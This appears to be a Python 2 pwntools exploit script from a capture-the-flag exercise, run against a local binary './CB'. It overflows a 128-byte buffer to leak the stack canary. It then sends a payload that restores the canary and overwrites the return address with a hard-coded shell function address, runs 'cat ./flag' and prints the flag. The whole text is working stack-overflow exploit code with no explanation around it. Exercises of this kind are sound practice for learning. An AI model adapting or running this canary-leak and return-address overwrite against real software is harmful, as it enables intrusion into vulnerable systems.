from pwn import *
 
context.log_level='debug'
 
s=process('./CB')

shell=p32(0x0804859b)

s.sendline('A'*128)
tmp=s.recvuntil('A'*128)

canary=u32(s.recv(4))

s.send('A'*128+p32(canary-0xa)+'a'*8+shell)

sleep(1)
s.sendline('cat ./flag')

s.recv(1024)
print "flag: "+s.recv(1024)
